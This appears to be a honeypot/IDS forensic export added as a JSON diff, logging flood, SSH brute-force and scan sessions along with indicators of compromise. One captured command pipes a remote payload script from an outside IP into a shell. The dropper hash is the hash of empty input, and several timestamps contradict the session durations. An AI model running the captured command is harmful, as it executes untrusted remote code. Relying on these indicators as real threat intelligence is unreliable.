@@ -1,0 +1,189 @@
+{
+  "metadata": {
+    "export_timestamp": "2026-10-07T14:17:07.611914Z",
+    "generator": "AegisNIDS Layer 2 Autonomous Forensic Engine",
+    "threat_defense_posture": "ELEVATED (DEFCON 2)",
+    "quarantine_tier": "HIGH_RISK (Risk Score >= 70)",
+    "honeypot_sandbox_status": "ONLINE",
+    "sessions_count": 4,
+    "iocs_count": 5
+  },
+  "quarantined_sessions": [
+    {
+      "attack_type": "DDOS_SYN_FLOOD",
+      "attacker_ip": "192.0.2.77",
+      "captured_commands": [
+        "SYN Packet burst detected (28 pkts)",
+        "Honeypot Decoy TCP ACK handshakes returned to stall attacker",
+        "Attacker bandwidth absorbed into sinkhole sandbox",
+        "Packet burst intercepted at 13:41:38 - Detained in sandbox",
+        "Packet burst intercepted at 14:09:15 - Detained in sandbox",
+        "Packet burst intercepted at 14:17:07 - Detained in sandbox"
+      ],
+      "duration": "00:01:15",
+      "mitre_ttp": "T1498.001 - Network Denial of Service: Direct Flood",
+      "protocol": "TCP/80",
+      "session_id": "HP-SESS-6804",
+      "start_time": "13:23:34",
+      "status": "QUARANTINED",
+      "target_port": 80,
+      "threat_intel": {
+        "asn": "AS41217 Autonomous System",
+        "country": "US",
+        "user_agent": "Automated Attack Script v1.4"
+      }
+    },
+    {
+      "attack_type": "DDOS_SYN_FLOOD",
+      "attacker_ip": "203.0.113.42",
+      "captured_commands": [
+        "GET /wp-login.php HTTP/1.1 (Host: 10.0.0.1)",
+        "GET /xmlrpc.php HTTP/1.1 [Flooding 250 req/sec]",
+        "POST /admin/ajax.php [Rapid Burst TCP ACK/SYN]",
+        "Packet burst intercepted at 00:52:30 - Detained in sandbox",
+        "Packet burst intercepted at 00:52:31 - Detained in sandbox",
+        "Packet burst intercepted at 01:03:50 - Detained in sandbox",
+        "Packet burst intercepted at 01:04:21 - Detained in sandbox",
+        "Packet burst intercepted at 01:04:32 - Detained in sandbox",
+        "Packet burst intercepted at 01:04:47 - Detained in sandbox",
+        "Packet burst intercepted at 01:05:13 - Detained in sandbox",
+        "Packet burst intercepted at 01:05:28 - Detained in sandbox",
+        "Packet burst intercepted at 01:06:08 - Detained in sandbox",
+        "Packet burst intercepted at 01:06:13 - Detained in sandbox",
+        "Packet burst intercepted at 01:17:36 - Detained in sandbox",
+        "Packet burst intercepted at 01:18:08 - Detained in sandbox",
+        "Packet burst intercepted at 01:18:24 - Detained in sandbox",
+        "Packet burst intercepted at 01:32:55 - Detained in sandbox",
+        "Packet burst intercepted at 01:35:55 - Detained in sandbox",
+        "Packet burst intercepted at 02:01:55 - Detained in sandbox",
+        "Packet burst intercepted at 02:07:55 - Detained in sandbox",
+        "Packet burst intercepted at 06:47:54 - Detained in sandbox",
+        "Packet burst intercepted at 06:47:55 - Detained in sandbox",
+        "Packet burst intercepted at 09:56:50 - Detained in sandbox"
+      ],
+      "duration": "00:04:12",
+      "mitre_ttp": "T1498.001 - Network DoS",
+      "protocol": "TCP/HTTP",
+      "session_id": "HP-SESS-9041",
+      "start_time": "18:09:39",
+      "status": "QUARANTINED",
+      "target_port": 80,
+      "threat_intel": {
+        "asn": "AS13335 Cloud Network",
+        "country": "NL",
+        "user_agent": "Mozilla/5.0 (compatible; Mirai/2.0)"
+      }
+    },
+    {
+      "attack_type": "BRUTE_FORCE",
+      "attacker_ip": "198.51.100.18",
+      "captured_commands": [
+        "SSH-2.0-OpenSSH_8.2p1 authentication attempts: 184 tries",
+        "Attempted usernames: root, admin, ubuntu, deploy, test",
+        "Decoy shell granted -> Attacker executed: `whoami`",
+        "Decoy shell -> Attacker executed: `uname -a; cat /proc/cpuinfo`",
+        "Decoy shell -> Attacker executed: `curl -s http://91.240.118.2/payload.sh | sh` [BLOCKED & HASHED]"
+      ],
+      "duration": "00:08:45",
+      "mitre_ttp": "T1110.001 - Password Guessing",
+      "protocol": "TCP/SSH",
+      "session_id": "HP-SESS-8922",
+      "start_time": "17:55:39",
+      "status": "QUARANTINED",
+      "target_port": 22,
+      "threat_intel": {
+        "asn": "AS49505 Host Provider",
+        "country": "RU",
+        "user_agent": "SSH-2.0-libssh-0.9.4"
+      }
+    },
+    {
+      "attack_type": "RECON_PORT_SCAN",
+      "attacker_ip": "45.143.201.12",
+      "captured_commands": [
+        "Nmap SYN scan sweeping ports 20-10000",
+        "Probe sent to /actuator/gateway/routes [Spring RCE Probe]",
+        "Probe sent to /solr/admin/info/system [Log4j/Solr Probe]"
+      ],
+      "duration": "00:02:18",
+      "mitre_ttp": "T1046 - Network Service Scanning",
+      "protocol": "TCP/HTTP",
+      "session_id": "HP-SESS-8710",
+      "start_time": "17:41:39",
+      "status": "TERMINATED",
+      "target_port": 8080,
+      "threat_intel": {
+        "asn": "AS200019 Digital Server",
+        "country": "DE",
+        "user_agent": "Mozilla/5.0 (Nmap Scripting Engine)"
+      }
+    }
+  ],
+  "indicators_of_compromise": [
+    {
+      "confidence": 74,
+      "first_seen": "13:23:34",
+      "indicator": "192.0.2.77",
+      "ioc_id": "IOC-005",
+      "last_seen": "Just now",
+      "mitre": "T1498.001",
+      "occurrences": 1,
+      "port": 80,
+      "severity": "HIGH",
+      "threat": "DDOS_SYN_FLOOD",
+      "type": "IPv4"
+    },
+    {
+      "confidence": 98,
+      "first_seen": "18:24:00",
+      "indicator": "203.0.113.42",
+      "ioc_id": "IOC-001",
+      "last_seen": "Just now",
+      "mitre": "T1498.001",
+      "occurrences": 342,
+      "port": 80,
+      "severity": "CRITICAL",
+      "threat": "DDOS_SYN_FLOOD",
+      "type": "IPv4"
+    },
+    {
+      "confidence": 94,
+      "first_seen": "17:40:12",
+      "indicator": "198.51.100.18",
+      "ioc_id": "IOC-002",
+      "last_seen": "10m ago",
+      "mitre": "T1110",
+      "occurrences": 184,
+      "port": 22,
+      "severity": "HIGH",
+      "threat": "SSH_BRUTE_FORCE",
+      "type": "IPv4"
+    },
+    {
+      "confidence": 88,
+      "first_seen": "16:15:33",
+      "indicator": "45.143.201.12",
+      "ioc_id": "IOC-003",
+      "last_seen": "25m ago",
+      "mitre": "T1046",
+      "occurrences": 56,
+      "port": 8080,
+      "severity": "MEDIUM",
+      "threat": "RECON_PORT_SCAN",
+      "type": "IPv4"
+    },
+    {
+      "confidence": 100,
+      "first_seen": "17:48:00",
+      "indicator": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "ioc_id": "IOC-004",
+      "last_seen": "10m ago",
+      "mitre": "T1059.004",
+      "occurrences": 1,
+      "port": 22,
+      "severity": "CRITICAL",
+      "threat": "MALICIOUS_DROPPER",
+      "type": "SHA-256"
+    }
+  ]
+}
